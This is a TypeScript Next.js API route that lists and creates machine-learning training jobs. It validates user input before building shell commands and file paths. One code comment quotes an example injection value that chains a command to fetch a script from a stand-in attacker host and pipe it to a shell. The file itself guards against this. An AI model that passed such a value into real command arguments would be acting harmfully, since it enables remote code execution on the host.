import { NextRequest, NextResponse } from "next/server";
import { db } from "@/lib/db";
import { requireAuth, buildUserFilter } from "@/lib/auth";
import { logActivity } from "@/lib/activity-log";
import { getWorkDir } from "@/lib/frameworks";
import { mergeYamlConfigs } from "@/lib/yaml-merge";
import { asConfigFramework, defaultTrainingParams, parseTrainingParams, totalStepsFor } from "@/lib/training-yaml";
import * as fs from "fs";
import * as path from "path";

/**
 * Turn user input into a safe single path segment.
 *
 * `job.name` is interpolated into filesystem paths (the job config file, the
 * output directory, and `DELETE /api/training-jobs/[id]/files`). Without this,
 * a name of `..` resolves the job folder to its parent, and the delete-files
 * endpoint would recursively remove the user's entire data directory.
 */
function toSafeSlug(input: string, fallback: string): string {
  const slug = input
    .replace(/\s+/g, "_")
    .replace(/[^a-zA-Z0-9_.-]/g, "")
    .replace(/^\.+/, "")
    .toLowerCase()
    .slice(0, 100);
  return slug.length > 0 ? slug : fallback;
}

/**
 * Validate `--gpus` input to a comma-separated list of non-negative integers.
 *
 * The value is interpolated into a command string that is later executed with
 * `shell: true`, so anything else is a shell-injection vector
 * (e.g. `"0; curl attacker.example | sh"`).
 */
function sanitizeGpuIds(raw: unknown): string | null {
  const value = typeof raw === "string" && raw.trim() ? raw.trim() : "0";
  const parts = value.split(",").map((p) => p.trim());
  if (parts.length === 0 || parts.length > 16) return null;
  const ids: number[] = [];
  for (const part of parts) {
    if (!/^\d{1,2}$/.test(part)) return null;
    const n = Number(part);
    if (!Number.isInteger(n) || n < 0 || n > 63) return null;
    if (!ids.includes(n)) ids.push(n);
  }
  return ids.length > 0 ? ids.join(",") : null;
}

// Helper to get folder size recursively
function getFolderSize(folderPath: string): number {
  let totalSize = 0;

  if (!fs.existsSync(folderPath)) {
    return 0;
  }

  const stats = fs.statSync(folderPath);

  if (stats.isFile()) {
    return stats.size;
  }

  const files = fs.readdirSync(folderPath);
  for (const file of files) {
    const filePath = path.join(folderPath, file);
    const fileStats = fs.statSync(filePath);

    if (fileStats.isDirectory()) {
      totalSize += getFolderSize(filePath);
    } else {
      totalSize += fileStats.size;
    }
  }

  return totalSize;
}

// GET /api/training-jobs - Get all training jobs with relations (filtered by user for non-admins)
export async function GET(request: NextRequest) {
  try {
    // Check authentication
    const auth = await requireAuth(request);
    if (auth instanceof NextResponse) return auth;

    const { userId, role } = auth;

    const { searchParams } = new URL(request.url);
    const page = parseInt(searchParams.get("page") || "1");
    const limit = parseInt(searchParams.get("limit") || "5");
    const skip = (page - 1) * limit;
    const status = searchParams.get("status");
    const projectId = searchParams.get("projectId");
    const datasetId = searchParams.get("datasetId");
    const modelId = searchParams.get("modelId");
    const configId = searchParams.get("configId");

    // Build where clause with user filter
    const userFilter = buildUserFilter(userId, role, 'userId');
    const where: Record<string, unknown> = { ...userFilter };

    if (status) {
      where.status = status;
    }
    if (projectId) {
      where.projectId = projectId;
    }
    if (datasetId) {
      where.datasetId = datasetId;
    }
    if (modelId) {
      where.modelId = modelId;
    }
    if (configId) {
      where.configId = configId;
    }

    const [jobs, total] = await Promise.all([
      db.trainingJob.findMany({
        where,
        skip,
        take: limit,
        orderBy: { createdAt: "desc" },
        include: {
          project: {
            select: {
              id: true,
              name: true,
              framework: true,
            },
          },
          dataset: {
            select: {
              id: true,
              name: true,
              format: true,
            },
          },
          model: {
            select: {
              id: true,
              name: true,
              architecture: true,
            },
          },
          config: {
            select: {
              id: true,
              name: true,
            },
          },
          _count: {
            select: { logs: true },
          },
        },
      }),
      db.trainingJob.count({ where }),
    ]);

    // Get system config for userConfigsPath
    const systemConfig = await db.systemConfig.findFirst();
    const userConfigsPath = (systemConfig as any)?.userConfigsPath;

    // Transform jobs to include absolute config paths
    const transformedJobs = jobs.map(job => {
      // If configPath is relative and userConfigsPath exists, convert to absolute
      let absoluteConfigPath = job.configPath;
      if (userConfigsPath && job.configPath && !path.isAbsolute(job.configPath)) {
        absoluteConfigPath = path.join(userConfigsPath, job.configPath);
      }
      return {
        ...job,
        absoluteConfigPath,
      };
    });

    return NextResponse.json({
      data: transformedJobs,
      pagination: {
        page,
        limit,
        total,
        totalPages: Math.ceil(total / limit),
      },
    });
  } catch (error) {
    console.error("Error fetching training jobs:", error);
    return NextResponse.json(
      { error: "Failed to fetch training jobs" },
      { status: 500 }
    );
  }
}

// POST /api/training-jobs - Create a new training job
export async function POST(request: NextRequest) {
  try {
    // Check authentication
    const auth = await requireAuth(request);
    if (auth instanceof NextResponse) return auth;

    const { userId, role } = auth;
    
    const body = await request.json();

    // Validate required relations and user access
    // Admin can access any project/dataset/model, regular user can only access their own
    const [project, dataset, model, trainingConfig] = await Promise.all([
      role === 'admin' 
        ? db.project.findUnique({ where: { id: body.projectId } })
        : db.project.findFirst({ 
            where: { 
              id: body.projectId,
              userId: userId,
            } 
          }),
      role === 'admin'
        ? db.dataset.findUnique({ where: { id: body.datasetId } })
        : db.dataset.findFirst({ 
            where: { 
              id: body.datasetId,
              userId: userId,
            } 
          }),
      role === 'admin'
        ? db.model.findUnique({ where: { id: body.modelId } })
        : db.model.findFirst({ 
            where: { 
              id: body.modelId,
              userId: userId,
            } 
          }),
      body.configId 
        ? (role === 'admin'
            ? db.trainingConfig.findUnique({ 
                where: { id: body.configId },
                select: {
                  id: true,
                  name: true,
                  epoch: true,
                  batchSize: true,
                  baseLr: true,
                  yamlConfig: true,
                }
              })
            : db.trainingConfig.findFirst({ 
                where: { 
                  id: body.configId,
                  userId: userId,
                },
                select: {
                  id: true,
                  name: true,
                  epoch: true,
                  batchSize: true,
                  baseLr: true,
                  yamlConfig: true,
                }
              }))
        : null,
    ]);

    if (!project) {
      return NextResponse.json({ error: "Project not found or access denied" }, { status: 400 });
    }
    if (!dataset) {
      return NextResponse.json({ error: "Dataset not found or access denied" }, { status: 400 });
    }
    if (!model) {
      return NextResponse.json({ error: "Model not found or access denied" }, { status: 400 });
    }

    // Get system config for framework path and userConfigsPath
    const systemConfig = await db.systemConfig.findFirst();
    const framework = project.framework || "PaddleDetection";
    const workDir = getWorkDir(framework, systemConfig);
    const userConfigsPath = (systemConfig as any)?.userConfigsPath;
    const userDatabasePath = (systemConfig as any)?.userDatabasePath;

    // Get current user info for username and storage quota
    const currentUser = await db.user.findUnique({
      where: { id: userId },
      select: { id: true, username: true, maxStorageQuota: true },
    });

    if (!currentUser) {
      return NextResponse.json({ error: "User not found" }, { status: 404 });
    }

    // Check storage quota - training jobs need space for models, logs, etc.
    if (userDatabasePath) {
      const userFolderPath = path.join(userDatabasePath, currentUser.username);
      const usedStorage = getFolderSize(userFolderPath);
      const maxQuota = Number(currentUser.maxStorageQuota);

      // Reserve 5GB for training job outputs (models, logs, etc.)
      const requiredSize = 5 * 1024 * 1024 * 1024; // 5GB in bytes

      if (usedStorage + requiredSize > maxQuota) {
        return NextResponse.json(
          {
            error: "存储空间不足",
            message: `您已使用 ${(usedStorage / 1024 / 1024 / 1024).toFixed(2)} GB，配额为 ${(maxQuota / 1024 / 1024 / 1024).toFixed(2)} GB。训练任务需要至少 5 GB 空间来存储模型和日志。请联系管理员扩容或删除不需要的数据。`,
            usedStorage,
            maxStorageQuota: maxQuota,
            requiredSpace: requiredSize
          },
          { status: 403 }
        );
      }
    }

    if (!workDir) {
      return NextResponse.json(
        { error: `${framework} path not configured in Settings` },
        { status: 400 }
      );
    }

    if (typeof body.name !== 'string' || !body.name.trim()) {
      return NextResponse.json({ error: "Job name is required" }, { status: 400 });
    }

    // Generate job name and file name. `jobName` becomes a path segment, so it
    // must be a safe slug (see `toSafeSlug`).
    const jobName = toSafeSlug(body.name, `job_${Date.now()}`);
    const configFileName = `${jobName}.yml`;

    // Deep-merge the three configs in precedence order: dataset -> training ->
    // model (later wins on conflicts).
    //
    // This used to be plain text concatenation, which produced duplicate
    // top-level keys. PyYAML tolerates that (last occurrence wins) but the
    // document is invalid YAML, and it forced overrides to be all-or-nothing:
    // a training config could not refine `train_dataset.transforms` without
    // restating the whole dataset block. `mergeYamlConfigs` merges on the YAML
    // AST so custom tags (`!COCODataSet`) survive, and falls back to the old
    // concatenation if any source fails to parse.
    const mergeResult = mergeYamlConfigs([
      { label: 'Dataset Configuration', content: dataset.yamlConfig },
      { label: 'Training Configuration', content: trainingConfig?.yamlConfig },
      { label: 'Model Configuration', content: model.yamlConfig },
    ]);
    if (mergeResult.warnings.length > 0) {
      console.warn(`[training-jobs] YAML merge warnings for "${jobName}":`, mergeResult.warnings);
    }
    let mergedYaml = mergeResult.yaml;

    if (!mergedYaml.trim()) {
      return NextResponse.json(
        {
          error: "The selected dataset, model, and training config have no YAML content. " +
            "Open each one and save it to generate its configuration first.",
        },
        { status: 400 }
      );
    }

    // Update save_dir to absolute path: {userDatabasePath}/{username}/jobs/{job_name}
    if (userDatabasePath && currentUser.username) {
      const absoluteSaveDir = path.join(userDatabasePath, currentUser.username, 'jobs', jobName);
      // Replace save_dir line with absolute path
      mergedYaml = mergedYaml.replace(
        /^save_dir:\s*.+$/gm,
        `save_dir: ${absoluteSaveDir}`
      );
    }

    // Save to userConfigsPath/{username}/jobs folder, fallback to old path if not set
    let configFilePath: string;
    let configPath: string;
    
    if (userConfigsPath && currentUser.username) {
      const jobsConfigDir = path.join(userConfigsPath, currentUser.username, 'jobs');
      if (!fs.existsSync(jobsConfigDir)) {
        fs.mkdirSync(jobsConfigDir, { recursive: true });
      }
      configFilePath = path.join(jobsConfigDir, configFileName);
      configPath = path.join(currentUser.username, 'jobs', configFileName);
    } else {
      // Fallback to old path
      const jobsConfigDir = path.join(workDir, 'configs', 'autotrain', 'jobs');
      if (!fs.existsSync(jobsConfigDir)) {
        fs.mkdirSync(jobsConfigDir, { recursive: true });
      }
      configFilePath = path.join(jobsConfigDir, configFileName);
      configPath = `configs/autotrain/jobs/${configFileName}`;
    }
    
    fs.writeFileSync(configFilePath, mergedYaml, 'utf-8');

    // Generate training command using absolute path
    // Always use paddle.distributed.launch --gpus for consistency with preview
    const gpuIds = sanitizeGpuIds(body.gpuIds);
    if (gpuIds === null) {
      return NextResponse.json(
        { error: "Invalid gpuIds: expected a comma-separated list of GPU indices, e.g. \"0\" or \"0,1\"" },
        { status: 400 }
      );
    }
    const useAmp = body.useAmp === true;
    const useVdl = body.useVdl === true;

    let command = '';
    let evalCommand = '';
    let inferCommand = '';
    const quotedConfigPath = `"${configFilePath}"`;

    // Compute save_dir once for PaddleSeg (absolute when userDatabasePath is
    // configured) so we can reuse it for both the CLI arg and the DB record.
    // Storing the absolute path in `outputDir` is what lets the checkpoints
    // API resolve `{save_dir}/best_model/model.pdparams` without any CLI
    // reparse fallback.
    // `project.name` is free-form user input but ends up both in a filesystem
    // path and, unquoted, inside a command string that is executed with
    // `shell: true`. Slugify it for the same reason as `jobName`.
    const projectSlug = toSafeSlug(project.name, 'project');
    const defaultOutputDir = `output/${projectSlug}/${jobName}`;

    const segSaveDir = (userDatabasePath && currentUser.username)
      ? path.join(userDatabasePath, currentUser.username, 'jobs', jobName)
      : defaultOutputDir;

    if (framework === 'PaddleSeg') {
      // PaddleSeg: save_dir is a CLI argument (the YAML has no top-level save_dir).
      const quotedSaveDir = `"${segSaveDir}"`;
      const bestModel = `"${path.join(segSaveDir, 'best_model', 'model.pdparams')}"`;

      command = `python -m paddle.distributed.launch --gpus ${gpuIds} tools/train.py --config ${quotedConfigPath} --do_eval --save_dir ${quotedSaveDir}`;
      if (useVdl) command += ' --use_vdl';

      // PaddleSeg evaluation (val.py) and prediction (predict.py)
      evalCommand = `python tools/val.py --config ${quotedConfigPath} --model_path ${bestModel}`;
      inferCommand = `python tools/predict.py --config ${quotedConfigPath} --model_path ${bestModel} --save_dir ${quotedSaveDir}/predict`;
    } else {
      command = `python -m paddle.distributed.launch --gpus ${gpuIds} tools/train.py -c ${quotedConfigPath}`;
      if (useAmp) command += ' --amp';
      if (useVdl) {
        command += ` --use_vdl=true --vdl_log_dir=${defaultOutputDir}/vdl`;
      }

      // Generate eval command using absolute path
      evalCommand = `python tools/eval.py -c ${quotedConfigPath} -o weights=${defaultOutputDir}/model_final.pdparams`;

      // Generate infer command (for single image inference) using absolute path
      inferCommand = `python tools/infer.py -c ${quotedConfigPath} -o weights=${defaultOutputDir}/model_final.pdparams`;
    }

    // Progress total. PaddleSeg reports iterations, the other frameworks report
    // epochs — conflating them is why Seg jobs used to render their progress
    // bar against a hardcoded 100 and sat at "0%" for the whole run.
    // Read it from the merged YAML so it stays correct even when the config was
    // hand-edited after its display columns were computed.
    const configFramework = asConfigFramework(framework);
    const resolvedParams = {
      ...defaultTrainingParams(configFramework),
      ...parseTrainingParams(configFramework, mergedYaml),
    };
    const totalSteps = totalStepsFor(configFramework, resolvedParams);

    // Create job in database with userId
    const job = await db.trainingJob.create({
      data: {
        projectId: body.projectId,
        datasetId: body.datasetId,
        modelId: body.modelId,
        configId: body.configId || null,
        userId: userId,
        name: body.name.trim(),
        status: 'pending',
        command: command,
        evalCommand: evalCommand,
        inferCommand: inferCommand,
        configPath: configPath,
        totalEpochs: totalSteps,
        // For PaddleSeg persist the absolute save_dir so the checkpoints API
        // can locate {save_dir}/best_model/... without parsing the command.
        outputDir: framework === 'PaddleSeg' ? segSaveDir : `${defaultOutputDir}`,
        vdlLogDir: useVdl ? `${defaultOutputDir}/vdl` : null,
        trainingParams: JSON.stringify({
          gpuIds,
          useAmp,
          useVdl,
          jobSlug: jobName,
          framework,
          totalSteps,
          epochs: configFramework === 'PaddleSeg' ? undefined : resolvedParams.epochs,
          iters: configFramework === 'PaddleSeg' ? resolvedParams.iters : undefined,
          batchSize: resolvedParams.trainBatchSize,
          baseLr: resolvedParams.baseLr,
        }),
        yamlConfig: mergedYaml,
      },
      include: {
        project: { select: { id: true, name: true, framework: true } },
        dataset: { select: { id: true, name: true, format: true } },
        model: { select: { id: true, name: true, architecture: true } },
        config: { select: { id: true, name: true } },
      },
    });

    // Log activity
    await logActivity(userId, {
      action: 'create_job',
      entityType: 'job',
      entityId: job.id,
      entityName: job.name,
      details: { projectId: body.projectId, projectName: project.name },
    });

    return NextResponse.json({ ...job, configPath }, { status: 201 });
  } catch (error) {
    console.error("Error creating training job:", error);
    return NextResponse.json(
      { error: "Failed to create training job", message: error instanceof Error ? error.message : "Unknown error" },
      { status: 500 }
    );
  }
}
